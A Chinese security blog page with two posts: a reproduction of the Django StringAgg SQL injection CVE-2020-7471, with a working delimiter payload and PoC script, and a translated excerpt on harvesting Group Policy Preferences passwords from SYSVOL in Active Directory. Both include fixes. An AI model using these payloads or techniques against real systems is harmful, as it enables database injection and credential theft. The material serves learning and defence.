<li>详细章节：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_34801745/article/details/110790957?spm=1001.2014.3001.5502</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/29/Django-sql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/29/Django-sql/" class="post-title-link" itemprop="url">Django-sql注入漏洞复现-CVE-2020-7471</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-29 19:53:21" itemprop="dateCreated datePublished" datetime="2021-03-29T19:53:21+08:00">2021-03-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-07 09:30:12" itemprop="dateModified" datetime="2021-04-07T09:30:12+08:00">2021-04-07</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Django作为开放源码的Web应用python框架，作为最有代表性的web框架，构建了多种网站和APP。Django负责处理网站开发中麻烦的部分，因此让开发者专注于应用程序的编写。其采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template），注重组件的重用性和“可插拔性”。<br><strong>原理</strong><br>通过构造分隔符，传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义符号（\）来注入恶意SQL语句。<br>漏洞的核心是StringAgg(delimiter),StringAgg聚合函数的delimiter参数存在SQL注入漏洞。</p>
<p>介绍下StringAgg，它会将输入的值使用 delimiter 分隔符级联起来。比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;&quot;-&quot;))</span><br></pre></td></tr></table></figure>

<p>这个查询操作就是查询 Info 对应的 postgres 数据表的 gender 列，将gender相同的 name 列使用横线连接聚合，输入如下：</p>
<p><img src="/2021/03/29/Django-sql/12.jpg"></p>
<p>漏洞位于django/django/contrib/postgres/aggregates/general.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from django.contrib.postgres.aggregates import StringAgg</span><br></pre></td></tr></table></figure>

<p>可以看到官方使用Value函数来防止注入，Value函数的内容如下</p>
<p><img src="/2021/03/29/Django-sql/10.jpg"></p>
<p><img src="/2021/03/29/Django-sql/11.jpg"></p>
<p>Value参数会被添加到sql参数列表，然后被Django内置的过滤机制过滤，来防注。</p>
<p>如何导致SQL 注入：<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django">django</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib">contrib</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres">postgres</a>/<a target="_blank" rel="noopener" href="https://github.com/django/django/tree/6b178a3e930f72069f3cda2e6a09d1b320fc09ec/django/contrib/postgres/aggregates">aggregates</a>/general.py</p>
<p><img src="/2021/03/29/Django-sql/14.jpg"></p>
<p>delimiter没有任何过滤，我们可以通过闭合单引号来利用注入</p>
<p><img src="/2021/03/29/Django-sql/4.png"></p>
<p>(此图摘自先知社区)</p>
<p>测试发现，当delimiter为单引号时，会报错。可以看出单引号未经过任何转义嵌入到了 SQL 语句中，然后需要追踪内部程序找出完整的 SQL 语句上下文。从上面的图中可以看出来，查询语句调用了self.cursor.execute，sql变量还没嵌入时，delimiter 的值如下：</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>（此图摘自先知社区）</p>
<p><img src="/2021/03/29/Django-sql/5.png"></p>
<p>运行后看到此时sql已加入delimiter为单引号的取值。因为此处sql为字符串，所以需要转义。若是postgres则会执行以下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;vul_app_info&quot;.&quot;gender&quot;, STRING_AGG(&quot;vul_app_info&quot;.&quot;name&quot;, &#39;&#39;&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1</span><br></pre></td></tr></table></figure>

<p>此时三个单引号会导致语法错误，postgres的注释符为’)–。将delimiter设置为<code>&#39;)--</code>，可以成功注释from语句</p>
<p>为构造合法的上下文，将 delimiter设置为</p>
<p>**’-&#39;) AS “mydefinedname” FROM “vul_app_info” GROUP BY “vul_app_info”.”gender” LIMIT 1 OFFSET 1 – ‘  **</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>若设置delimiter为<code>-</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delimiter&#x3D;&quot;-&quot;</span><br></pre></td></tr></table></figure>

<p>该语句使用StringAgg类，用于将输入的值使用delimiter分隔符级联。原本的语句中，查询info对应的gender列，并使用-来连接。就可以<strong>通过修改delimiter的内容来实现注入</strong>。</p>
<p>输出为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;gender&#39;: &#39;female&#39;, &#39;mydefinedname&#39;: &#39;zhang&#39;&#125;</span><br><span class="line">&#123;&#39;gender&#39;: &#39;male&#39;, &#39;mydefinedname&#39;: &#39;li-zhao&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;-&#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br><span class="line">   print(&quot;[+]注入后的的输出：&quot;)</span><br><span class="line">   payload &#x3D; &#39;-\&#39;) AS &quot;mydefinedname&quot; FROM &quot;vul_app_info&quot; GROUP BY &quot;vul_app_info&quot;.&quot;gender&quot; LIMIT 1 OFFSET 1 -- &#39;</span><br><span class="line">   results &#x3D; Info.objects.all().values(&#39;gender&#39;).annotate(mydefinedname&#x3D;StringAgg(&#39;name&#39;, delimiter&#x3D;payload))</span><br><span class="line">   for e in results:</span><br><span class="line">       print(e)</span><br></pre></td></tr></table></figure>



<h2 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h2><ul>
<li>影响版本<br>Django 1.11.x &lt; 1.11.28<br>Django 2.2.x &lt; 2.2.10<br>Django 3.0.x &lt; 3.0.3<br>Django 主开发分支<br>其中Django 1.11.28、Django 2.2.10、Django 3.0.3不受影响。</li>
<li>测试环境<br>kalil<br>Django 3.0.2<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2>pip install django==3.0.2<br>安装postgres数据库，创建数据库test,并修改数据库密码<br><img src="/2021/03/29/Django-sql/1.png"><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2></li>
</ul>
<ol>
<li>由于刚才更改了数据库密码，于是更改配置文件的数据库名称以及密码<br>进入CVE-2020-7471/sqlvul_projects/settings.py，修改数据库配置，如果之前安装postgres数据库使用的默认配置（包括密码），这里就不需修改任何任何配置.<br>此处只需修改password为刚才设置密码。<br><img src="/2021/03/29/Django-sql/2.png"><br><img src="/2021/03/29/Django-sql/3.png"></li>
<li>再利用CVE-2020-7471/manage.py初始化测试数据库test数据库中的表<br><img src="/2021/03/29/Django-sql/4.jpg"><br>初始化环境完成。</li>
<li>进入test数据库查看表<br>进入数据库<br>\c test<br>查看全部表<br>\d<br><img src="/2021/03/29/Django-sql/5.jpg"><br>查看表vul_app_info的信息<br>select * from vul_app_info;<br><img src="/2021/03/29/Django-sql/6.jpg"><br>可以看到此刻表为空</li>
<li>执行POC向数据库写入数据<br><img src="/2021/03/29/Django-sql/7.jpg"><br>若执行成功POC中将插入三条数据<br>利用CVE-2020-7471/CVE-2020-7471.py写入数据<br><img src="/2021/03/29/Django-sql/8.jpg"><br><img src="/2021/03/29/Django-sql/9.jpg"><br>写入成功。<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h2>升级到Django最新版3.0.3<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3></li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a></li>
<li><a target="_blank" rel="noopener" href="https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/">https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/03/28/domain/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/28/domain/" class="post-title-link" itemprop="url">域渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-28 19:57:57" itemprop="dateCreated datePublished" datetime="2021-03-28T19:57:57+08:00">2021-03-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-30 15:39:47" itemprop="dateModified" datetime="2021-03-30T15:39:47+08:00">2021-03-30</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory"><a href="#翻译和复现Attack-Methods-for-Gaining-Domain-Admin-Rights-in-Active-Directory" class="headerlink" title="翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory"></a>翻译和复现Attack Methods for Gaining Domain Admin Rights in Active Directory</h1><p> 攻击者有很多方法可以获得活动目录中的域管理权限。本篇文章旨在介绍一些目前比较流行的方法。这里描述的 “assume breach”建立在攻击者已经在内部系统上有了立足点，并获得了域用户凭证（即后渗透阶段）。<br>不幸的是，对于大多数企业来说，攻击者从域用户到域管理员往往不需要很长时间。防御者心中的问题是 “这种情况是如何发生的？”。<br>攻击通常从向用户发送鱼叉式钓鱼电子邮件开始，使攻击者能够在目标网络内的计算机上运行代码。一旦攻击者让他们的代码在企业内部运行，第一步就是进行侦察，发现可用资源，从而提升权限，坚持下去，当然还有收集关键信息（通常是一个组织的 “皇冠上的珠宝”）。<br>While the overall process detail varies, the overall theme remains:<br>虽然流程细节各不相同，但总的主题仍然是：<br>恶意软件注入(鱼叉式钓鱼、web漏洞等)<br>内部侦察<br>窃取凭证<br>利用及提权<br>数据访问及过滤<br>后门维持<br>攻击者首先得在企业内部有一个立足点。此外，攻击者通常从攻击者的用户权限提升到本地管理员权限并不是很难。提权利用可以通过利用系统上未打补丁的权限升级漏洞来实现，更为常见的是在SYSVOL（如组策略首选项）中找到本地管理员密码。<br>在2015年举办的BSides, Shakacon, Black Hat, DEF CON, 和 DerbyCon这五个安全会议中，我谈到了本文中的大部分技术。<br>我也在 “The Most Common Active Directory Security Issues and What You Can Do to Fix Them “一文中介绍了其中的一些问题。</p>
<p>从域用户到域管理员的攻击技术：<br>1.SYSVOL和组策略首选项中的密码<br>这种方法是最简单的，不需要特殊的 “黑客 “工具。攻击者所要做的就是打开Windows资源管理器，搜索域SYSVOL DFS共享中的XML文件。大多数情况下，groups.xml、scheduletasks.xml、Services.xml等XML文件会包含凭证。</p>
<p>SYSVOL是Active Directory中的域范围共享，AD中所有经过认证的用户都可以读取访问。SYSVOL包含登录脚本、组策略数据和其他需要在有域控制器的任何地方提供的域范围内的数据（因为SYSVOL在所有域控制器之间自动同步和共享）。所有域组策略都存储在这里/DOMAIN&gt; /SYSVOL/<br><DOMAIN>/Policies/</DOMAIN></p>
<p>当创建一个新的GPP时，会在SYSVOL中创建一个相关的XML文件，里面有相关的配置数据，如果有提供密码，则是AES-256加密、。</p>
<p>除了在2012年之前，微软在MSDN上公布了AES加密密钥（共享秘密），可以用来解密密码。由于经过认证的用户（任何域用户或受信任域中的用户）都有对SYSVOL的读取权限，因此域中的任何人都可以在SYSVOL共享中搜索包含 “cpassword “的XML文件，该文件是包含AES加密密码的值。<br><img src="/2021/03/28/domain/1.png"><br>通过访问这个XML文件，攻击者可以使用AES私钥来解密GPP密码。PowerSploit函数Get-GPPPassword对于组策略优先级的利用最为有用。以上截图显示了一个类似的PowerShell函数，从SYSVOL中找到的XML文件中加密GPP密码。<br><img src="/2021/03/28/domain/2.png"><br>其他文件类型也可能有内嵌的密码（通常是明文的），如vbs和bat。<br><img src="/2021/03/28/domain/3.jpeg"><br>我们会认为，随着补丁的发布，管理员应该不会再在组策略首选项中放置凭证，但是我在评估客户安全时，仍然会在SYSVOL中发现凭证。</p>
<p>解决方法：</p>
<ul>
<li>在每台用于管理GPO的计算机上安装KB2962486，它可以防止新的凭证被放在组策略首选项中。</li>
<li>删除SYSVOL中包含密码的现有GPP xml文件。</li>
<li>不要把密码放在所有经过认证的用户都能访问的文件中。<br>关于这种攻击方法的更多信息在帖子中介绍。Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences.</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">Try & Enjoy</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">52</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">77k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:10</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/page/2/',]
      });
      });
  </script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
